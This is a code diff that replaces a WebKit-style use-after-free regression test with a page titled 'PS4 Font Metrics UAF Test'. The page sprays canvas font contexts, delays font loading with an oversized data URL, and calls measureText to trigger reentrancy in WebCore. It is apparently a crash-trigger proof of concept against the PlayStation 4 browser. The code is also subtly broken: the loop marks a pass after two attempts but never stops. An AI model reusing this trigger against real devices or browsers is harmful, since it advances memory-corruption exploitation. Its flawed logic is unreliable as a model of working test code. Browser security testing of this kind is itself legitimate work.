@@ -1,54 +1,67 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="utf-8">
+    <title>PS4 Font Metrics UAF Test - Option A</title>
+</head>
 <body>
-<script>
-function gc() {
-    function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
+    <p>This test passes if it does not crash.</p>
+    <div id="status">Testing...</div>
+
+    <script>
+    
+    function runTestOptionA() {
+        // 1. Criar instâncias dummy de canvas para inflar a cache de fontes
+        const dummies = [];
+        for (let i = 0; i < 3500; i++) {
+            const dummy = document.createElement('canvas');
+            dummy.width = 1;
+            dummy.height = 1;
+            const ctx = dummy.getContext('2d');
+            ctx.font = '10px "dummy' + i + '"';
+            dummies.push(ctx);
+        }
+
+        // Data URL grande (>= 1MB) para forçar o atraso no carregamento da fonte
+        const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+        const keepAlive = [];
+
+        // 2. Processamento assíncrono em fatias
+        let attempt = 0;
+
+        function step() {
+            if (attempt >= 2) {
+                document.getElementById('status').innerText = 'PASS if no crash';
+                
+            }
+
+            const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
+            const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
+
+            document.fonts.add(metricsDonor);
+            document.fonts.add(measured);
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 64;
+            canvas.height = 64;
+            const context = canvas.getContext('2d');
+
+            context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
+            keepAlive.push(metricsDonor, measured, context);
+
+            // Medição que dispara a reentrância no WebCore
+            context.measureText('\u13A0\u13A2\u13A4');
+
+            attempt++;
+            setTimeout(step, 0);
+        }
+
+        setTimeout(step, 0);
     }
-    for (var i = 0; i < 10000; i++)
-    gcRec(10);
-}
 
-
-let survivor, child, list;
-let result = 'PASS if no crash.';
-
-// The setup runs inside a function so the secondary document is not reachable from a
-// global once it returns, and can therefore be collected below.
-(function setup() {
-    let secondaryDocument = document.implementation.createHTMLDocument();
-    secondaryDocument.body.innerHTML = '<input id="i"><label for="i"></label>';
-
-    // One successful lookup registers the list for invalidation at the secondary document
-    // and leaves the index cache's WeakPtr to the <label> as its only valid state.
-    list = secondaryDocument.getElementById('i').labels;
-    if (!list[0])
-        result = 'FAIL: expected the labels list to find the <label>.';
-
-    // Disconnected elements keep the secondary document alive via its referencing node
-    // count, without keeping its JS wrapper reachable.
-    survivor = secondaryDocument.createElement('div');
-    child = secondaryDocument.createElement('span');
-})();
-
-// Destroys the <label>, so the index cache's WeakPtr nulls itself with no code running on
-// the node list. The list must still be considered registered at the document. This has to
-// happen in an earlier collection than the one that destroys the node list below.
-gc(); gc(); gc();
-
-// Destroys the node list, which has to unregister itself from the document here.
-list = null;
-gc(); gc(); gc();
-
-// Walks the document's node list registry. Used to dereference the freed node list.
-survivor.appendChild(child);
-
-document.body.textContent = result;
-</script>
+    window.onload = function() {
+        setTimeout(runTestOptionA, 0);
+    };
+    </script>
 </body>
 </html>
